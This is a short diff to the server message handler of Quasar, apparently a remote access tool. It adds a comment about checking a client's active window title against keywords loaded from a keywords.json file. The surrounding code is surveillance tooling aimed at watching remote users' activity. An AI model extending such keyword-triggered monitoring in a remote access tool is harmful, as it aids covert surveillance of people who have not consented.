@@ -137,6 +137,8 @@ namespace Quasar.Server.Messages
         {
             OnUserActiveWindowStatusUpdated(client, message.WindowTitle);
 
+            // checks if the title contains a key word
+
             Task.Run(() =>
             {
                 string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
